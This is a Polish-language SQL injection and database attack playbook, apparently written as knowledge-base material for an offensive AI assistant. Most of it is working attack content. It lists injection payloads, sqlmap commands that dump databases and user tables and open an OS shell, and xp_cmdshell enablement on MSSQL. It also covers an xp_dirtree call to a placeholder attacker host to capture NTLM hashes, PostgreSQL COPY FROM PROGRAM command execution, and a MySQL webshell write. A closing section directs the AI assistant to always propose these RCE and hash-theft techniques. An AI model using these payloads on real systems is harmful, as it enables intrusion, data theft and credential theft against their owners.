
# 06 Databases and SQLi Playbook — Ataki na Bazy Danych i SQL Injection

Ta notatka steruje logiką identyfikacji, manualnej weryfikacji i automatycznej eksploatacji podatności SQL Injection (SQLi) oraz atakami na serwery relacyjnych baz danych (MSSQL, PostgreSQL, MySQL/MariaDB).

---

## 🎯 Metodologia Ataku na Bazy Danych (DB Attack Flow)

1. MANUAL / CONTEXT RECON (Wykrycie punktu wstrzyknięcia, typu bazy danych i kontekstu wykonania)
   ↓
2. AUTOMATED EXPLOITATION (Przejęcie danych/hasze z użyciem `sqlmap`)
   ↓
3. DIRECT RCE / PRIVILEGE ESCALATION (Eksploatacja funkcji bazodanowych do uzyskania powłoki systemowej)

---

## 🌲 Drzewo Decyzyjne DB & SQLi

### Krok 1: Weryfikacja Manualna SQLi
* **Pytanie:** Jak potwierdzić podatność w parametrze (GET/POST/Header)?
* **Wektory:**
  * **Auth Bypass:** `' OR 1=1-- -` lub `" OR "1"="1`
  * **Error-based / Syntax Check:** `'` lub `"` lub `')` (sprawdź czy aplikacja zwraca błąd bazy).
  * **Union-based:** `' UNION SELECT NULL, NULL, version()-- -` (dobieraj liczbę kolumn).
  * **Time-based Blind:** `' OR SLEEP(5)-- -` (MySQL) lub `' WAITFOR DELAY '0:0:5'-- -` (MSSQL).

### Krok 2: Automatyzacja z `sqlmap`
* **Pytanie:** Jak poprawnie i bezpiecznie uruchomić `sqlmap`?
* **Zasady `sqlmap`:**
  * **Żądanie z pliku (Burp/ZAP):** `sqlmap -r request.txt -p <PODATNY_PARAMETR> --batch`
  * **Pobranie baz danych:** `sqlmap -u "http://<IP>/page.php?id=1" --dbs --batch`
  * **Zrzut tabeli użytkowników:** `sqlmap -u "http://<IP>/page.php?id=1" -D <DATABASE> -T users --dump --batch`
  * **Próba uzyskania OS Shell:** `sqlmap -r request.txt --os-shell --batch`
* **Uwaga:** ZAWSZE dodawaj flagę `--batch`, aby wyłączyć interaktywne pytania w terminalu.

### Krok 3: RCE i Post-Exploitation na MSSQL
* **Pytanie:** Mamy dostęp do MSSQL (jako user `sa` lub z uprawnieniem `ALTER SETTINGS`) — jak zdobyć RCE lub hasze NTLM?
* **Wektory RCE (xp_cmdshell):**
  1. **Włączenie opcji zaawansowanych:**  
     `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`
  2. **Włączenie xp_cmdshell:**  
     `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
  3. **Wykonanie komendy OS:**  
     `EXEC xp_cmdshell 'whoami';`
* **Wektor Capture NTLM Hash (xp_dirtree / Responder):**
  * Jeśli `xp_cmdshell` jest zablokowane, wymuś uwierzytelnienie SMB do Respondera na Kali:  
    `EXEC master..xp_dirtree '\\<KALI_IP>\share';`

### Krok 4: RCE na PostgreSQL (wersje >= 9.3)
* **Pytanie:** Jak uzyskać wykonanie komend na serwerze PostgreSQL posiadając uprawnienia superużytkownika (postgres)?
* **Wektor RCE (COPY PROGRAM):**
  1. `CREATE TABLE cmd_exec(cmd_output text);`
  2. `COPY cmd_exec FROM PROGRAM 'id';`
  3. `SELECT * FROM cmd_exec;`

### Krok 5: RCE na MySQL / MariaDB (INTO OUTFILE)
* **Pytanie:** Jak zapisać webshella przez SQLi w MySQL?
* **Wektor File Write:**
  *' UNION SELECT 1, '<?php /* WEBSHELL_PAYLOAD */ ?>', 3 INTO OUTFILE '/var/www/html/shell.php'-- -
  * *Wymaganie:* Znamy ścieżkę do katalogu webroot oraz zmienna `secure_file_priv` w MySQL jest pusta (`""`).

---

## ⚡ Twarde Wskazówki dla RAG / Asystenta AI
* Kiedy użytkownik podaje plik żądania HTTP z Burp Suite, ZAWSZE używaj komendy `sqlmap -r request.txt --batch` zamiast podawania gołych adresów URL z flagą `-u`.
* ZAWSZE dołączaj flagę `--batch` do komend `sqlmap`, aby zapobiec zawieszaniu się skryptów w sesjach interaktywnych.
* Jeśli kontekst dotyczy **MSSQL** i użytkownik posiada wysokie uprawnienia (lub konto `sa`), ZAWSZE proponuj włączenie `xp_cmdshell` LUB przejęcie hasza NTLM za pomocą `xp_dirtree` i narzędzia Responder.
* Jeśli kontekst dotyczy **PostgreSQL** i użytkownik szuka RCE, ZAWSZE proponuj technikę `COPY ... FROM PROGRAM`.
* Podczas prób zapisania webshella przez MySQL (`INTO OUTFILE`), przypomnij użytkownikowi o konieczności znajomości dokładnej ścieżki webroot oraz braku blokady w `secure_file_priv`.
* * MSSQL to środowisko Windows: do weryfikacji RCE w `xp_cmdshell` ZAWSZE używaj komendy `whoami` (nigdy `id`), a docelowym uprawnieniem jest `SYSTEM` / `Administrator` (nigdy `root`).